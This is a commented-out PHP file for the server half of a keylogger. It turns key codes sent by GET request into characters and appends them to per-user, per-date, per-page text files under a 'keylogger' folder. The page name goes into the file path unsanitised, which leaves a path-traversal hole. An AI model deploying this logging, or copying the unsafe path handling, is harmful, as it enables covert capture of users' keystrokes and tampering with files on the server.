<?php
// session_start();
// $user_id = $_SESSION['login_id'];

// date_default_timezone_set('Asia/Calcutta');
// $foder_name = date('d_F_Y');



// //fetch character key value using get method..
// $var = $_GET['press_key'];		//example.. $var = 12,13,14,18,58,29.... and so on..
// $page = $_GET['page'];
// //convert $var to character or keyname.. according to it's key value.. 
// switch($var)
// 	{
// 		case 8:
// 		$char = " 'backspace' ";
// 		break;
		
// 		case 9:
// 		$char = " 'tab' ";
// 		break;
		
// 		case 13:
// 		$char = " 'enter' ";
// 		break;
		
// 		case 16:
// 		$char = " 'shift' ";
// 		break;
		
// 		case 17:
// 		$char = " 'ctrl' ";
// 		break;
		
// 		case 18:
// 		$char = " 'alt' ";
// 		break;
		
// 		case 19:
// 		$char = " 'pause/break' ";
// 		break;
		
// 		case 20:
// 		$char = " 'caps_lock' ";
// 		break;
		
// 		case 27:
// 		$char = " 'escape' ";
// 		break;
		
// 		case 32:
// 		$char = " 'space' ";
// 		break;
		
// 		case 33:
// 		$char = " 'page_up' ";
// 		break;
		
// 		case 34:
// 		$char = " 'page_down' ";
// 		break;

// 		case 35:
// 		$char = " 'end' ";
// 		break;
		
// 		case 36:
// 		$char = " 'home' ";
// 		break;
		
// 		case 37:
// 		$char = " 'left_arrow' ";
// 		break;
		
// 		case 38:
// 		$char = " 'up_arrow' ";
// 		break;
		
// 		case 39:
// 		$char = " 'right_arrow' ";
// 		break;
		
// 		case 40:
// 		$char = " 'down_arrow' ";
// 		break;
		
// 		case 45:
// 		$char = " 'insert' ";
// 		break;
		
// 		case 46:
// 		$char = " 'delete' ";
// 		break;
		
// 		case 48:
// 		$char = "0";
// 		break;
		
// 		case 49:
// 		$char = "1";
// 		break;
		
// 		case 50:
// 		$char = "2";
// 		break;

// 		case 51:
// 		$char = "3";
// 		break;
		
// 		case 52:
// 		$char = "4";
// 		break;
		
// 		case 53:
// 		$char = "5";
// 		break;
		
// 		case 54:
// 		$char = "6";
// 		break;
		
// 		case 55:
// 		$char = "7";
// 		break;
		
// 		case 56:
// 		$char = "8";
// 		break;
		
// 		case 57:
// 		$char = "9";
// 		break;
		
// 		case 59:
// 		$char = ";";
// 		break;
		
// 		case 61:
// 		$char = "=";
// 		break;
		
// 		case 65:
// 		$char = "a";
// 		break;
		
// 		case 66:
// 		$char = "b";
// 		break;
		
// 		case 67:
// 		$char = "c";
// 		break;
		
// 		case 68:
// 		$char = "d";
// 		break;
		
// 		case 69:
// 		$char = "e";
// 		break;
		
// 		case 70:
// 		$char = "f";
// 		break;
		
// 		case 71:
// 		$char = "g";
// 		break;
		
// 		case 72:
// 		$char = "h";
// 		break;
		
// 		case 73:
// 		$char = "i";
// 		break;
		
// 		case 74:
// 		$char = "j";
// 		break;
		
// 		case 75:
// 		$char = "k";
// 		break;
		
// 		case 76:
// 		$char = "l";
// 		break;
		
// 		case 77:
// 		$char = "m";
// 		break;
		
// 		case 78:
// 		$char = "n";
// 		break;
		
// 		case 79:
// 		$char = "o";
// 		break;
		
// 		case 80:
// 		$char = "p";
// 		break;
		
// 		case 81:
// 		$char = "q";
// 		break;
		
// 		case 82:
// 		$char = "r";
// 		break;
		
// 		case 83:
// 		$char = "s";
// 		break;
		
// 		case 84:
// 		$char = "t";
// 		break;
		
// 		case 85:
// 		$char = "u";
// 		break;
		
// 		case 86:
// 		$char = "v";
// 		break;
		
// 		case 87:
// 		$char = "w";
// 		break;
		
// 		case 88:
// 		$char = "x";
// 		break;
		
// 		case 89:
// 		$char = "y";
// 		break;
		
// 		case 90:
// 		$char = "z";
// 		break;

// 		case 91:
// 		$char = " 'left_window_key' ";
// 		break;
		
// 		case 92:
// 		$char = " 'right_window_key' ";
// 		break;
		
// 		case 93:
// 		$char = " 'select_key' ";
// 		break;
		
// 		case 96:
// 		$char = "0";
// 		break;
		
// 		case 97:
// 		$char = "1";
// 		break;
		
// 		case 98:
// 		$char = "2";
// 		break;
		
// 		case 99:
// 		$char = "3";
// 		break;
		
// 		case 100:
// 		$char = "4";
// 		break;
		
// 		case 101:
// 		$char = "5";
// 		break;
		
// 		case 102:
// 		$char = "6";
// 		break;
		
// 		case 103:
// 		$char = "7";
// 		break;
		
// 		case 104:
// 		$char = "8";
// 		break;
		
// 		case 105:
// 		$char = "9";
// 		break;

// 		case 106:
// 		$char = "*";
// 		break;
		
// 		case 107:
// 		$char = "+";
// 		break;
		
// 		case 109:
// 		$char = "-";
// 		break;
		
// 		case 110:
// 		$char = ".";
// 		break;
		
// 		case 111:
// 		$char = "/";
// 		break;
		
// 		case 112:
// 		$char = " f1 ";
// 		break;
		
// 		case 113:
// 		$char = " f2 ";
// 		break;
		
// 		case 114:
// 		$char = " f3 ";
// 		break;
		
// 		case 115:
// 		$char = " f4 ";
// 		break;
		
// 		case 116:
// 		$char = " f5 ";
// 		break;
		
// 		case 117:
// 		$char = " f6 ";
// 		break;
		
// 		case 118:
// 		$char = " f7 ";
// 		break;
		
// 		case 119:
// 		$char = " f8 ";
// 		break;
		
// 		case 120:
// 		$char = " f9 ";
// 		break;
		
// 		case 121:
// 		$char = " f10 ";
// 		break;
		
// 		case 122:
// 		$char = " f11 ";
// 		break;
		
// 		case 123:
// 		$char = " f12 ";
// 		break;
		
// 		case 144:
// 		$char = " 'num_lock' ";
// 		break;
		
// 		case 145:
// 		$char = " 'scroll_lock' ";
// 		break;
		
// 		case 187:
// 		$char = "=";
// 		break;
		
// 		case 186:
// 		$char = ";";
// 		break;
		
// 		case 188:
// 		$char = ",";
// 		break;
		
// 		case 189:
// 		$char = "-";
// 		break;
		
// 		case 190:
// 		$char = ".";
// 		break;
		
// 		case 191:
// 		$char = "/";
// 		break;
		
// 		case 192:
// 		$char = "`";
// 		break;
		
// 		case 219:
// 		$char = "[";
// 		break;
		
// 		case 220:
// 		$char = "\\";
// 		break;
		
// 		case 221:
// 		$char = "]";
// 		break;
		
// 		case 222:
// 		$char = "'";
// 		break;

// 	}
	
	
// //check if folder exist or not..
// $file_name = "$page.txt";
// if(file_exists("keylogger/$user_id/$foder_name/$file_name"))
// {
// 	//folder exist.
// }
// else //if file does not exist..then create a file..
// {
// 	$path = "keylogger/$user_id/$foder_name/$file_name";
// 	$path = fopen($path, 'w') or die("can't open file");
// 	fclose($path);
// }	
	


// //read text file..
// $myFile = "keylogger/$user_id/$foder_name/$file_name";
// //open text file in read mode..
// $fh_read = fopen($myFile, 'r');
// //read text file content..
// $read_all_data = fgets($fh_read);
// //close file..
// fclose($fh_read);


// //write text file..
// $myFile = "keylogger/$user_id/$foder_name/$file_name";
// //open text file in write mode..
// $fh_write = fopen($myFile, 'w') or die("can't open file");
// //read past data which is already present in textfile..
// $write_all_data = $read_all_data;
// //add new character in to past data..
// $write_all_data .= $char;
// //overwrite data into text file..
// fwrite($fh_write, $write_all_data);
// //file close..
// fclose($fh_write);


?>